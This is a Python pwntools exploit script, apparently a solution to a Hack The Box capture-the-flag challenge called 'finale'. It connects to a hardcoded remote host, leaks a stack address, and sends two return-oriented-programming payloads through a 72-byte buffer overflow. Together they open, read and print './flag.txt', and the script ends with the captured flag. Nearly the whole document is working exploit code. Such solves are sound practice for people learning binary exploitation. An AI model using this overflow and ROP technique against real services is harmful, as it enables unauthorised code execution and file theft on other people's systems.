from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#io = process('./finale')
#io = gdb.debug('./finale', 'break main')
ip, port = '144.126.226.105', 32567
io = remote(ip, port)

elf = ELF('./finale')

io.sendlineafter('tell us the secret phrase:', 's34s0nf1n4l3b00')
io.recvuntil('good luck: ')
buf_addr = p64(int(io.recvuntil('\n').decode().split('[')[1].split(']')[0], 16))
print(hex(u64(buf_addr)))
buf2_addr = p64(u64(buf_addr)+16)

pop_rdi_ret = 0x00000000004012d6
pop_rsi_ret = 0x00000000004012d8
ret = 0x000000000040101a
fd = 3

padding = b'A'*(64+8)
payload = padding
#read ./flag.txt from stdin to stack
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_ret)
payload += buf_addr
payload += p64(0x00401170)
payload += p64(ret)*32
#open ./flag.txt
payload += p64(pop_rdi_ret)
payload += buf_addr
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(0x004011c0)
payload += p64(ret)*128
#puts the flag
payload += p64(pop_rdi_ret)
payload += buf_addr
payload += p64(0x00401120)
#back to finale()
payload += p64(0x00401407)

io.sendlineafter('tell us a wish for next year:', payload)
io.sendline('./flag.txt\x00')

#1. need add ret*32~256 to wait for buffer flushed
#2. have to have 2nd attack, RDX == 1
payload = padding
#read flag into stack
payload += p64(pop_rdi_ret)
payload += p64(fd)
payload += p64(pop_rsi_ret)
payload += buf2_addr
payload += p64(0x00401170)
payload += p64(ret)*256
#close fd
#payload += p64(pop_rdi_ret)
#payload += p64(fd)
#payload += p64(0x00401160)
#puts the flag
payload += p64(pop_rdi_ret)
payload += buf2_addr
payload += p64(0x00401120)
'''
#write buf fail as RDX <= 1
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += buf_addr
payload += p64(0x00401130)
'''

io.sendlineafter('tell us a wish for next year:', payload)
print(io.recvall())

#HTB{wh0_n33d5_l1bc_wh3n_u_h4v3_st4ck_l45k5}
